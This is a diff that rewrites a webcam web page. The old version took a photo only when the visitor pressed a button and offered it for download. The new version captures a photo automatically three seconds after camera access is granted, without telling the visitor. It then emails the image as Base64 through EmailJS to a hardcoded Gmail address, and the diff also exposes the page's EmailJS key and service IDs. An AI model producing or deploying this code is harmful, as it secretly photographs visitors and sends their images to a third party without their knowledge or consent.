@@ -1,39 +1,71 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Capture Photo</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Auto Capture Photo & Send Email</title>
 </head>
 <body>
-    <h1>Take a Photo</h1>
-    <video id="video" width="320" height="240" autoplay></video>
-    <button id="capture">Capture Photo</button>
-    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
-    <a id="download" href="#" download="photo.jpg">Download Photo</a>
+  <h1>Photo Capture and Email</h1>
+  <!-- Video stream displaying the camera feed -->
+  <video id="video" width="320" height="240" autoplay></video>
+  <!-- Hidden canvas to capture the video frame -->
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+  <!-- Image element to display the captured photo (optional) -->
+  <img id="capturedImage" alt="Captured Photo" style="display:block; margin-top:10px;" />
 
-    <script>
-        const video = document.getElementById('video');
-        const captureButton = document.getElementById('capture');
-        const canvas = document.getElementById('canvas');
-        const downloadLink = document.getElementById('download');
-        const ctx = canvas.getContext('2d');
+  <!-- Include EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script type="text/javascript">
+    // Initialize EmailJS with your User ID (public key)
+    emailjs.init("E-Yahu2ZTHEAVqgj5");
 
-        // Access the camera
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-            })
-            .catch(err => {
-                console.error("Error accessing the camera: ", err);
-            });
+    // Reference elements
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const capturedImage = document.getElementById('capturedImage');
 
-        // Capture the image and save it
-        captureButton.addEventListener('click', () => {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const dataUrl = canvas.toDataURL('image/jpeg');
-            downloadLink.href = dataUrl;
+    // Start the video stream
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((stream) => {
+        video.srcObject = stream;
+        // After 3 seconds, capture the photo
+        setTimeout(capturePhoto, 3000);
+      })
+      .catch((err) => {
+        console.error("Error accessing camera: ", err);
+      });
+
+    // Capture the photo and then send the email
+    function capturePhoto() {
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      // Convert the canvas image to a Base64 data URL
+      const imageData = canvas.toDataURL('image/png');
+      // Optional: Display the captured image on the page
+      capturedImage.src = imageData;
+      
+      // Send the email using EmailJS with the captured image
+      sendEmail(imageData);
+    }
+
+    // Function to send email using EmailJS
+    function sendEmail(imageData) {
+      const templateParams = {
+        to_email: "vaikemees68@gmail.com", // Email address updated
+        subject: "Captured Photo",
+        message: "Here's the photo taken from the website:",
+        image: imageData // The captured image in Base64 format
+      };
+
+      emailjs.send('service_52rk00o', 'template_vv6zxp5', templateParams)
+        .then((response) => {
+          console.log('Email successfully sent!', response.status, response.text);
+        }, (error) => {
+          console.error('Failed to send email:', error);
         });
-    </script>
+    }
+  </script>
 </body>
 </html>
